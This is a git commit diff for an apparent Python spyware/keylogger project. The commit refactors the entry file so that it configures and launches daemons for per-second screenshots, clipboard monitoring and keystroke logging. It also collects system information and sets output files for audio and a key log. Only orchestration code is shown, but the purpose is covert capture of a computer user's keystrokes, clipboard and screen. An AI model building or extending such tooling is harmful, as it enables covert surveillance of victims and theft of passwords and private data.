5e3254e189a68afdc9f9bf2a6b429d96f8e3d44a
Alfredo Manrique <signas13@gmail.com>
2025-07-31 04:05:14 -0400

    refactor: dependencies in exec.py for main file

--- exec.py
+++ exec.py
@@ -1,24 +1,51 @@
+from typing import List
 from src.domain.config import Config
+from src.domain.system_daemon import System_Daemon
 from src.applications.common.logger_handler import Logger
 from src.main import Main
 
-
-config: Config = {
-    "FILE_PATH": "./output",
-    "EXTEND": "/",  # on windows use "\\",
-    "ENCRYPT_KEY": "",
-    "SYSTEM_INFORMATION": "syseminfo.txt",
-    "CLIPBOARD_INFORMATION": "clipboard.txt",
-    "AUDIO_INFORMATION": "audio.wav",
-    "SCREENSHOT_INTERVAL": 1,
-    "SCREENSHOT_INFORMATION": "screenshot.png",
-    "KEYS_INTERVAL": 1,
-    "KEYS_INFORMATION": "key_log.txt",
-}
+# Daemons
+from src.applications.daemons.screenshots_interval import Screenshots_Interval
+from src.applications.daemons.clipboar_observer import Clipboard_Observer
+from src.applications.daemons.keyboard_observer import Keyboard_Observer
 
 
 if __name__ == "__main__":
-    Main(config, logger=Logger("Main"))
+    config: Config = {
+        "FILE_PATH": "./output",
+        "EXTEND": "/",  # on windows use "\\",
+        "ENCRYPT_KEY": "",
+        "SYSTEM_INFORMATION": "syseminfo.txt",
+        "CLIPBOARD_INFORMATION": "clipboard.txt",
+        "AUDIO_INFORMATION": "audio.wav",
+        "SCREENSHOT_INTERVAL": 1,
+        "SCREENSHOT_INFORMATION": "screenshot.png",
+        "KEYS_INTERVAL": 1,
+        "KEYS_INFORMATION": "key_log.txt",
+    }
+
+    logger = Logger("Main")
+
+    daemons: List[System_Daemon] = [
+        Screenshots_Interval(
+            config,
+            logger=Logger("Screenshot_Interval"),
+            number_of_iterations=0,
+            number_of_iterations_end=3,
+        ),
+        Clipboard_Observer(
+            config,
+            logger=Logger("Clipboard_Observer"),
+            poll_interval=1,
+        ),
+        Keyboard_Observer(
+            config,
+            logger=Logger("Keys_Observer"),
+            idle_time_limit=5.0,
+        ),
+    ]
+
+    Main(config, logger, daemons)
 
 
 """
--- src/main.py
+++ src/main.py
@@ -9,70 +9,48 @@ from src.domain.system_daemon import System_Daemon
 from src.applications.common.logger_handler import Logger
 from src.applications.computer_information import get_computer_information
 
-# Daemons
-from src.applications.daemons.screenshots_interval import Screenshots_Interval
-from src.applications.daemons.clipboar_observer import Clipboard_Observer
-from src.applications.daemons.keyboard_observer import Keyboard_Observer
-
 
 class Main:
-    def __init__(self, config: Config, logger: Logger):
-        signal.signal(signal.SIGINT, self._handle_signals)
-        signal.signal(signal.SIGTERM, self._handle_signals)
-        self._config: Config = config
-        self._logger: Logger = logger
-        self._futures: list[Future[None]] = []
-        self._daemons: List[System_Daemon] = self._get_daemons(config)
-        self._executor = ThreadPoolExecutor(max_workers=len(self._daemons))
+    def __init__(self, config: Config, logger: Logger, daemons: List[System_Daemon]):
+        signal.signal(signal.SIGINT, self.__handle_signals)
+        signal.signal(signal.SIGTERM, self.__handle_signals)
+        self.__logger: Logger = logger
+        self.__executor = ThreadPoolExecutor(max_workers=len(daemons))
+        self.__daemons = daemons
+        self.__futures: list[Future[None]] = []
         try:
-            self._logger.info("starting")
+            self.__logger.info("starting")
             get_computer_information(config, logger=Logger("Info"))
-            for daemon in self._daemons:
-                self._futures.append(self._executor.submit(daemon.start))
-        except Exception as e:
-            self._logger.error("** MainException **", e)
-            self._shutdown(1)
+            for _daemon in daemons:
+                self.__futures.append(self.__executor.submit(_daemon.start))
+        except Exception as _e:
+            self.__logger.error("** MainException **", _e)
+            self.__shutdown(1)
 
-    def _handle_signals(self, signum: int, frame: FrameType | None) -> NoReturn:
-        self._logger.info(f"Signal: {signum} {frame}")
-        self._shutdown(0)
+    def __handle_signals(self, signum: int, frame: FrameType | None) -> NoReturn:
+        self.__logger.info(f"Signal: {signum} {frame}")
+        self.__shutdown(0)
         raise
 
-    def _get_daemons(self, config: Config) -> List[System_Daemon]:
-        return [
-            Screenshots_Interval(
-                config,
-                logger=Logger("Screenshot_Interval"),
-                number_of_iterations=0,
-                number_of_iterations_end=3,
-            ),
-            Clipboard_Observer(
-                config,
-                logger=Logger("Clipboard_Observer"),
-                poll_interval=1,
-            ),
-            Keyboard_Observer(
-                config,
-                logger=Logger("Keys_Observer"),
-                idle_time_limit=5.0,
-            ),
-        ]
-
-    def _shutdown(self, code: int) -> None:
+    def __shutdown(self, code: int) -> None:
         try:
-            for daemon in self._daemons:
-                daemon.stop()
-                del daemon
-            for future in self._futures:
-                self._logger.warn(f"closing {future}")
+            for _daemon in self.__daemons:
+                _daemon.stop()
+                del _daemon
+            del self.__daemons
+            for future in self.__futures:
+                self.__logger.warn(f"closing {future}")
                 future.cancel()
-            for future in self._futures:
                 future.result(timeout=5)
-                self._logger.info(f"Future: {future}")
+                self.__logger.info(f"Future: {future}")
         except Exception as e:
-            self._logger.error("problem in shutdown", e)
+            self.__logger.error("problem in shutdown", e)
         finally:
-            self._executor.shutdown(wait=True, cancel_futures=True)
-            self._futures.clear()
-        self._logger.info("shutdown gracefully!")
-        sys.exit(code)
+            self.__executor.shutdown(wait=True, cancel_futures=True)
+            self.__futures.clear()
+            del self.__futures
+            del self.__executor
+            self.__logger.info("shutdown gracefully!")
+            del self.__logger
+            del self
+            sys.exit(code)
